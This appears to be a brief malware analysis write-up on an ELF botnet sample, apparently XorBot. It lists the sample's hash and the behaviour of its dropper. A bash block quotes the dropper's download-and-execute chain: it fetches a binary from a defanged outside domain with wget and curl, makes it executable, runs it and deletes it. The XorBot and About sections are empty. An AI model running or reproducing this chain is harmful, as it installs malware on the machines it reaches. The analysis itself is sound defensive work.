**SHA256**: 9eac4c35a3229382569a9ffbb6466342b9f6cb23b771e49415e8999ad5cd0b35  
**FileType**: ELF  
**Sample**: [9eac4c35a3229382569a9ffbb6466342b9f6cb23b771e49415e8999ad5cd0b35](https://bazaar.abuse.ch/sample/9eac4c35a3229382569a9ffbb6466342b9f6cb23b771e49415e8999ad5cd0b35/)
**Author(OPTIONAL)**: M-Faheem-Khan  

**Table Of Contents**
- [About](#about)
- [Analysis](#analysis)
    - [Dropper](#dropper) 
    - [Xorbot](#xorbot) 

## About  
## Analysis  
### Dropper  
The script(dropper) perfroms the following actions:
- Deletes `bin.sh` which is likely a script left over from previous infections.
- Files are downloaded from `conn[.]masjesu[.]zip` the `zip` tld indicates malicous activity(`zip` domains are used for malicious puprposes due to the domain looking like a `zip` file)
- Files are downloaded using both `wget` and `curl`
- Downloads files for various architectures (i586, mips, powerpc, x86_64, i686, arm, sparc, sh4, m69k)
- The permissions for the payload are changed to `777`
- The payload is executed and then removed
- The step repeat for each architecture.
- The script then attempts to change into potential writable directories(`/tmp`, `/var/run`, `/mnt`, `/root`, `/`)
- The above steps are repeat 

```bash
# Steps to download and execute the payload
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; 
wget http[:]//conn[.]masjesu[.]zip/bins/UbfzQ4EsN9H8dTGF29dT5wpM9NODp5hI7B;
curl -O  http[:]//conn[.]masjesu[.]zip/bins/UbfzQ4EsN9H8dTGF29dT5wpM9NODp5hI7B;
/bin/busybox 
wget http[:]//conn[.]masjesu[.]zip/bins/UbfzQ4EsN9H8dTGF29dT5wpM9NODp5hI7B; 
chmod 777 UbfzQ4EsN9H8dTGF29dT5wpM9NODp5hI7B; 
./UbfzQ4EsN9H8dTGF29dT5wpM9NODp5hI7B;
rm UbfzQ4EsN9H8dTGF29dT5wpM9NODp5hI7B
```

### XorBot  




<!-- EOF -->
